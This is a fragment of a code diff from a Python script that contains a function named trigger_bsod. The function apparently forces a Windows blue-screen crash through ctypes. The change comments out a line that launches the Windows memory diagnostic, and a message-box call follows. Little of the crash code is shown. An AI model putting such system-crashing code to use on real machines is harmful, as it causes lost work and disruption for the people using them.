@@ -30,8 +30,8 @@ def trigger_bsod():
         byref(c_uint())
     )
 
-subprocess.Popen("MdSched.exe", shell=True)
-time.sleep(2)
+#subprocess.Popen("MdSched.exe", shell=True)
+#time.sleep(2)
 
 ctypes.windll.user32.MessageBoxW(
     0,
